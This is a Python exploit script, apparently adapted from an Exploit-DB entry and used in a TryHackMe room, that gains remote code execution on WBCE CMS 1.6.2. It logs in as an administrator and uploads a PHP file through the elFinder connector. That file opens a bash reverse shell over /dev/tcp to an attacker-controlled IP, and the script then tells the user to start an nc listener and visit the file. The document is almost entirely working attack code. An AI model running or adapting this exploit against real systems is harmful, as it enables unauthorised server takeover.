# Exploit Title: WBCE CMS v1.6.2 - Remote Code Execution (RCE)
# Date: 3/5/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://wbce-cms.org/
# Software Link: https://github.com/WBCE/WBCE_CMS/archive/refs/tags/1.6.2.zip
# Version: 1.6.2
# Tested on: MacOS
#  original script: https://www.exploit-db.com/exploits/52039
# Updated by Grok AI
# used on tryhackme room Avengers Hub https://tryhackme.com/room/HackfinityBattleEncore
# YouTube video link: https://youtu.be/XWBN_T3v0zY

import requests
from bs4 import BeautifulSoup
import sys
import time

def login(url, username, password):
    print("Logging in...")
    time.sleep(3)
    with requests.Session() as session:
        response = session.get(url + "/admin/login/index.php")
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form', attrs={'name': 'login'})
        form_data = {
            input_tag['name']: input_tag.get('value', '') 
            for input_tag in form.find_all('input') 
            if input_tag.get('type') != 'submit'
        }
        form_data[soup.find('input', {'name': 'username_fieldname'})['value']] = username
        form_data[soup.find('input', {'name': 'password_fieldname'})['value']] = password
        
        post_response = session.post(url + "/admin/login/index.php", data=form_data)
        if "Administration" in post_response.text:
            print("Login successful!")
            time.sleep(3)
            return session
        else:
            print("Login failed.")
            print("Headers received:", post_response.headers)
            print("Response content:", post_response.text[:500])
            return None

def upload_file(session, url):
    print("Shell preparing...")
    time.sleep(3)
    attacker_ip = "YOUR_ATTACKER_IP"  # Replace with your IP (e.g., "192.168.1.100")
    attacker_port = "4444"  # Replace with your port (e.g., "4444")
    files = {
        'upload[]': (
            'revshell.inc',
            f"""<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
// Reverse shell using popen
$cmd = "bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'";
$handle = popen($cmd, 'r');
if($handle) {{
    while(!feof($handle)) {{ 
        fread($handle, 4096); 
    }}
    pclose($handle);
}}
?>""",
            'application/octet-stream'
        )
    }
    data = {
        'reqid': '18f3a5c13d42c5',
        'cmd': 'upload',
        'target': 'l1_Lw',
        'mtime[]': '1714669495'
    }
    response = session.post(
        url + "/modules/elfinder/ef/php/connector.wbce.php",
        files=files,
        data=data
    )
    if response.status_code == 200:
        print("Reverse Shell Uploaded: " + url + "/media/revshell.inc")
        print(f"Start listener on your machine: nc -lvnp {attacker_port}")
        print("Then visit the URL above to trigger the reverse shell")
    else:
        print("Failed to upload file.")
        print(response.text)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python script.py <url> <username> <password>")
        sys.exit(1)
        
    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    session = login(url, username, password)
    if session:
        upload_file(session, url)
